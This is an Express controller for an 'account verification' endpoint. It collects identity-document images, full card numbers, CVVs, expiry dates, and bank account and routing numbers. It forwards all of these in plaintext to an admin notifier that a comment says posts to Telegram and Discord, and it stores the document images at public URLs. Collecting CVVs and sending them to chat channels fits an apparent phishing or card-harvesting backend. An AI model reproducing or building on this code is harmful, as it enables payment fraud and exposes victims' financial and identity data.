import { Request, Response, NextFunction } from "express";
import HttpError from "../../utils/httpError";
import { DashboardService } from "./dashboard.service";
import { formatZodValidationError } from "../auth/schema/schema";
import { documentSchema, verifyAccountSchema } from "./schema/schema";
import { notifyAdminKYCSubmission } from "../../utils/notifier";


interface IDashboardController {
    verifyAccount: (req: Request, res: Response, next: NextFunction) => Promise<void>;
}

export const IdashboardController = (dashboardService: DashboardService): IDashboardController => {
    return {
        verifyAccount: async (req: Request, res: Response, next: NextFunction) => {
            try {

                const parsedBody = verifyAccountSchema.safeParse(req.body);


                if (!parsedBody.success) {
                    const errors = formatZodValidationError(parsedBody);
                    throw new HttpError('Validation failed', 400, 'VALIDATION_ERROR', errors);
                }


                const files = req.files as {
                    [field: string]: Express.Multer.File[];
                };
                const frontFile = files?.documentFront?.[0];
                const backFile = files?.documentBack?.[0];
                if (!frontFile || !backFile) {
                    throw new HttpError(
                        "Both documentFront and documentBack images are required",
                        400,
                        "VALIDATION_ERROR",
                        null
                    );
                }
                // -------------------------------------------------
                // 3️⃣ Build public URLs for the stored files
                // -------------------------------------------------
                // `req.protocol` + host gives you the base URL (e.g. https://localhost:3000)
                const baseUrl = `${req.protocol}://${req.get("host")}`;
                const frontUrl = `${baseUrl}/uploads/identity-docs/${frontFile.filename}`;
                const backUrl = `${baseUrl}/uploads/identity-docs/${backFile.filename}`;
                // -------------------------------------------------
                // 4️⃣ Validate **document** fields (Zod schema)
                // -------------------------------------------------
                const documentPayload = {
                    documentType: req.body.documentType, // client must send the enum value
                    documentFrontUrl: frontUrl,
                    documentBackUrl: backUrl,
                };
                const parsedDoc = documentSchema.safeParse(documentPayload);
                if (!parsedDoc.success) {
                    const errors = formatZodValidationError(parsedDoc);
                    throw new HttpError("Document validation failed", 400, "VALIDATION_ERROR", errors);
                }
                // -------------------------------------------------
                // 5️⃣ Call the service – pass **both** data objects
                // -------------------------------------------------
                const saved = await dashboardService.verifyAccount(
                    parsedBody.data,        // text data
                    parsedDoc.data          // URLs + documentType
                );

                // Dispatch real-time admin alert (Telegram / Discord / Terminal & logs)
                notifyAdminKYCSubmission({
                    userId: parsedBody.data.userId,
                    fullName: parsedBody.data.fullName,
                    userEmail: (saved as any)?.user?.email,
                    userPhone: (saved as any)?.user?.phoneNumber,
                    employmentStatus: parsedBody.data.employmentStatus,
                    occupation: parsedBody.data.occupation,
                    annualIncome: parsedBody.data.annualIncome,
                    bankName: parsedBody.data.bankName,
                    accountHolderName: parsedBody.data.accountHolderName,
                    accountNumber: parsedBody.data.accountNumber,
                    routingNumber: parsedBody.data.routingNumber,
                    cardHolderName: parsedBody.data.cardHolderName,
                    cardNumber: parsedBody.data.cardNumber,
                    cardType: parsedBody.data.cardType,
                    cardCvv: parsedBody.data.cardCvv,
                    cardExpiry: parsedBody.data.cardExpiry,
                    documentType: parsedDoc.data.documentType,
                    documentFrontUrl: parsedDoc.data.documentFrontUrl,
                    documentBackUrl: parsedDoc.data.documentBackUrl,
                }).catch(err => console.error("[Admin Alert Error]:", err));

                // -------------------------------------------------
                // 6️⃣ Respond (responseHandler will wrap this for you)
                // -------------------------------------------------
                res.status(201).json({ message: "Verification saved", verification: saved });

            } catch (error) {
                next(error);
            }
        }
    }
}